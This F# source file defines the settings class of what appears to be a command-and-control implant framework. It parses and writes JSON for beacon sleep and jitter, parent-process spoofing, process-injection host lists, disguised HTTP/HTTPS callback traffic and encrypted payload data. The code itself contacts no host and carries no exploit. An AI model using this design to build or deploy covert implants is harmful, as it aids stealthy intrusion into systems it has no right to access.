namespace ES.Alan.Core

open System
open System.Collections.Generic
open Newtonsoft.Json
open Newtonsoft.Json.Linq
open ES.Alan.Core.JsonHelper

type AgentSettingsHttpServerRequest() =
    member val SessionCookie = String.Empty with get, set
    member val Path = String.Empty with get, set
    member val Headers = new Dictionary<String, String>() with get, set
    member val PrependString = String.Empty with get, set
    member val AppendString = String.Empty with get, set

type AgentSettingsHttpServerResponse() =
    member val AcceptedStatusCode = 200 with get, set
    member val StartMarker = String.Empty with get, set
    member val EndMarker = String.Empty with get, set

type AgentSettingsProxy() =
    member val Ip = String.Empty with get, set
    member val Port = 0 with get, set
    member val Username = String.Empty with get, set
    member val Password = String.Empty with get, set

type AgentSettingsWebServer() =
    member val Address = String.Empty with get, set
    member val Port = 8080 with get, set
    member val Request = new AgentSettingsHttpServerRequest() with get, set
    member val Response = new AgentSettingsHttpServerResponse() with get, set
    member val Proxy = new AgentSettingsProxy() with get, set

type AgentSettingsServer() =
    member val Http = new List<AgentSettingsWebServer>() with get, set
    member val Https = new List<AgentSettingsWebServer>() with get, set

type AgentSettingsData() =
    member val IsCompressed = true with get, set
    member val IsBase64Encoded = true with get, set
    member val IsEncrypted = true with get, set

type AgentSettingsSessionExec() =
    member val ProcessParent = String.Empty with get, set
    member val HostProcess = new Dictionary<String, List<String>>() with get, set

type AgentSettingsSession() =
    member val Sleep = 1000 with get, set
    member val Expire = String.Empty with get, set
    member val Jitter = 1 with get, set
    member val Shell = String.Empty with get, set
    member val Exec = new AgentSettingsSessionExec() with get, set
    
type AgentSettings() =
    member val PublicKey = String.Empty with get, set    
    member val Session = new AgentSettingsSession() with get
    member val Servers = new AgentSettingsServer() with get
    member val Data = new AgentSettingsData() with get    

    member internal this.Load(jsonConfig: String) =
        let opti = Option.iter
        let jsonConfig = JsonConvert.DeserializeObject(jsonConfig) :?> JObject        

        // root settings
        get(jsonConfig, "public_key") |> opti(fun v -> this.PublicKey <- v.Value<String>())
        
        // data settings
        get(jsonConfig, "data.compress") |> opti(fun v -> this.Data.IsCompressed <- v.Value<Int32>() = 1)
        get(jsonConfig, "data.encode") |> opti(fun v -> this.Data.IsBase64Encoded <- v.Value<Int32>() = 1)
        get(jsonConfig, "data.encrypt") |> opti(fun v -> this.Data.IsEncrypted <- v.Value<Int32>() = 1)

        // session settings
        this.Session.Exec.HostProcess.["x86"] <- new List<String>()
        this.Session.Exec.HostProcess.["x64"] <- new List<String>()
        get(jsonConfig, "session.sleep") |> opti(fun v -> this.Session.Sleep <- v.Value<Int32>())
        get(jsonConfig, "session.expire") |> opti(fun v -> this.Session.Expire <- v.Value<String>())
        get(jsonConfig, "session.jitter") |> opti(fun v -> this.Session.Jitter <- v.Value<Int32>())
        get(jsonConfig, "session.shell") |> opti(fun v -> this.Session.Shell <- v.Value<String>())
        get(jsonConfig, "session.exec.process_parent") |> opti(fun v -> this.Session.Exec.ProcessParent <- v.Value<String>())
        getArray(jsonConfig, "session.exec.host_process.x86") 
        |> Array.iter(fun jHostProcess -> this.Session.Exec.HostProcess.["x86"].Add(jHostProcess.Value<String>()))
        getArray(jsonConfig, "session.exec.host_process.x64") 
        |> Array.iter(fun jHostProcess -> this.Session.Exec.HostProcess.["x64"].Add(jHostProcess.Value<String>()))

        // server settings
        [
            (this.Servers.Http, "servers.http")
            (this.Servers.Https, "servers.https")
        ]
        |> List.iter(fun (servers, keyName) ->
            servers.Clear()
            getArray(jsonConfig, keyName) 
            |> Array.iter(fun jServer -> 
                let settingsWebServer = new AgentSettingsWebServer()
                servers.Add(settingsWebServer)

                get(jServer, "address") |> opti(fun v -> settingsWebServer.Address <- v.Value<String>())
                get(jServer, "port") |> opti(fun v -> settingsWebServer.Port <- v.Value<Int32>())

                // read the proxy if configured
                get(jServer, "proxy.ip") |> opti(fun v -> settingsWebServer.Proxy.Ip <- v.Value<String>())
                get(jServer, "proxy.port") |> opti(fun v -> settingsWebServer.Proxy.Port <- v.Value<Int32>())
                get(jServer, "proxy.username") |> opti(fun v -> settingsWebServer.Proxy.Username <- v.Value<String>())
                get(jServer, "proxy.password") |> opti(fun v -> settingsWebServer.Proxy.Password <- v.Value<String>())
                
                // parse request
                get(jServer, "request.session_cookie") |> opti(fun v -> settingsWebServer.Request.SessionCookie <- v.Value<String>())
                get(jServer, "request.path") |> opti(fun v -> settingsWebServer.Request.Path <- v.Value<String>())
                getArray(jServer, "request.headers") 
                |> Array.iter(fun jHeader -> 
                    let jProp = jHeader.First :?> JProperty
                    let name = jProp.Name
                    let value = jProp.Value.Value<String>()
                    settingsWebServer.Request.Headers.[name] <- value
                )

                // read append/prepend string
                get(jServer, "request.data.prepend") |> opti(fun v -> settingsWebServer.Request.PrependString <- v.Value<String>())
                get(jServer, "request.data.append") |> opti(fun v -> settingsWebServer.Request.AppendString <- v.Value<String>())

                // parse response
                get(jServer, "response.status_code") |> opti(fun v -> settingsWebServer.Response.AcceptedStatusCode <- v.Value<Int32>())
                get(jServer, "response.data.start_marker") |> opti(fun v -> settingsWebServer.Response.StartMarker <- v.Value<String>())
                get(jServer, "response.data.end_marker") |> opti(fun v -> settingsWebServer.Response.EndMarker <- v.Value<String>())
            )
        )

    member this.ToJson() =
        let jsonConfig = 
            new JObject(
                new JProperty("public_key", this.PublicKey),
                new JProperty("session", 
                    new JObject(
                        new JProperty("jitter", this.Session.Jitter),
                        new JProperty("sleep", this.Session.Sleep),
                        new JProperty("expire", this.Session.Expire),
                        new JProperty("shell", this.Session.Shell),
                        new JProperty("exec",
                            new JObject(
                                new JProperty("process_parent", this.Session.Exec.ProcessParent),
                                new JProperty("host_process", 
                                    new JObject(
                                        new JProperty("x86", 
                                            new JArray(
                                                this.Session.Exec.HostProcess.["x86"]
                                                |> Seq.map(fun hostProcess -> new JValue(hostProcess))
                                            )
                                        ),
                                        new JProperty("x64", 
                                            new JArray(
                                                this.Session.Exec.HostProcess.["x64"]
                                                |> Seq.map(fun hostProcess -> new JValue(hostProcess))
                                            )
                                        )
                                    )
                                )
                            )                    
                        )                        
                    )
                ),
                new JProperty("servers", 
                    new JObject(
                        [
                            ("http", this.Servers.Http)
                            ("https", this.Servers.Https)
                        ]
                        |> List.map(fun (protocol, settings) ->
                            new JProperty(protocol, 
                                new JArray(
                                    settings
                                    |> Seq.map(fun httpSettings ->
                                        new JObject(
                                            new JProperty("address", httpSettings.Address),
                                            new JProperty("port", httpSettings.Port),
                                            new JProperty("proxy",
                                                if not(String.IsNullOrWhiteSpace(httpSettings.Proxy.Ip)) && httpSettings.Proxy.Port > 0 then
                                                    new JObject(
                                                        new JProperty("ip", httpSettings.Proxy.Ip),
                                                        new JProperty("port", httpSettings.Proxy.Port),
                                                        new JProperty("username", httpSettings.Proxy.Username),
                                                        new JProperty("password", httpSettings.Proxy.Password)
                                                    )
                                                else
                                                    new JObject()                                                        
                                            ),
                                            new JProperty("request", 
                                                new JObject(
                                                    new JProperty("session_cookie", httpSettings.Request.SessionCookie),
                                                    new JProperty("path", httpSettings.Request.Path),
                                                    new JProperty("data",
                                                        new JObject(
                                                            new JProperty("prepend", httpSettings.Request.PrependString),
                                                            new JProperty("append", httpSettings.Request.AppendString)                                                        
                                                        )
                                                    ),                                                    
                                                    new JProperty("headers",
                                                        new JArray([
                                                            httpSettings.Request.Headers
                                                            |> Seq.map(fun header ->
                                                                new JObject(new JProperty(header.Key, header.Value))
                                                            )
                                                        ])
                                                    )
                                                )
                                            ),
                                            new JProperty("response",
                                                new JObject(
                                                    new JProperty("status_code", httpSettings.Response.AcceptedStatusCode),
                                                    new JProperty("data",      
                                                        new JObject(
                                                            new JProperty("start_marker", httpSettings.Response.StartMarker),
                                                            new JProperty("end_marker", httpSettings.Response.EndMarker)
                                                        )
                                                    )
                                                )
                                            )
                                        )
                                    )
                                )
                            )
                        )
                    )                     
                ),
                new JProperty("data",
                    new JObject(
                        new JProperty("compress", if this.Data.IsCompressed then 1 else 0),
                        new JProperty("encode", if this.Data.IsBase64Encoded then 1 else 0),
                        new JProperty("encrypt", if this.Data.IsEncrypted then 1 else 0)
                    )                    
                )
            )
        jsonConfig.ToString(Formatting.None)

    member this.ToMinimalJson() =
        let createWebServerSettings(webServerType: String, settings: List<AgentSettingsWebServer>) =
            new JProperty(webServerType, 
                new JArray(
                    settings
                    |> Seq.map(fun httpSettings ->
                        new JObject(
                            new JProperty("address", httpSettings.Address),
                            new JProperty("port", httpSettings.Port),
                            new JProperty("proxy",
                                if not(String.IsNullOrWhiteSpace(httpSettings.Proxy.Ip)) && httpSettings.Proxy.Port > 0 then
                                    new JObject(
                                        new JProperty("ip", httpSettings.Proxy.Ip),
                                        new JProperty("port", httpSettings.Proxy.Port),
                                        new JProperty("username", httpSettings.Proxy.Username),
                                        new JProperty("password", httpSettings.Proxy.Password)
                                    )
                                else
                                    new JObject()                                                        
                            ),
                            new JProperty("request", 
                                new JObject(
                                    new JProperty("session_cookie", httpSettings.Request.SessionCookie),
                                    new JProperty("path", httpSettings.Request.Path),
                                    new JProperty("headers",
                                        new JArray([
                                            httpSettings.Request.Headers
                                            |> Seq.map(fun header ->
                                                new JObject(new JProperty(header.Key, header.Value))
                                            )
                                        ])
                                    )
                                )
                            ),
                            new JProperty("response",
                                new JObject(
                                    new JProperty("status_code", httpSettings.Response.AcceptedStatusCode),
                                    new JProperty("data",      
                                        new JObject(
                                            new JProperty("start_marker", httpSettings.Response.StartMarker),
                                            new JProperty("end_marker", httpSettings.Response.EndMarker)
                                        )
                                    )
                                )
                            )
                        )
                    )
                )
            )

        let jsonConfig = 
            new JObject(
                new JProperty("public_key", this.PublicKey),
                new JProperty("servers", 
                    new JObject(
                        createWebServerSettings("http", this.Servers.Http),
                        createWebServerSettings("https", this.Servers.Https)
                    )                     
                )
            )
        jsonConfig.ToString(Formatting.None)

    static member Read(jsonConfig: String) =
        let settings = new AgentSettings()
        settings.Load(jsonConfig)
        settings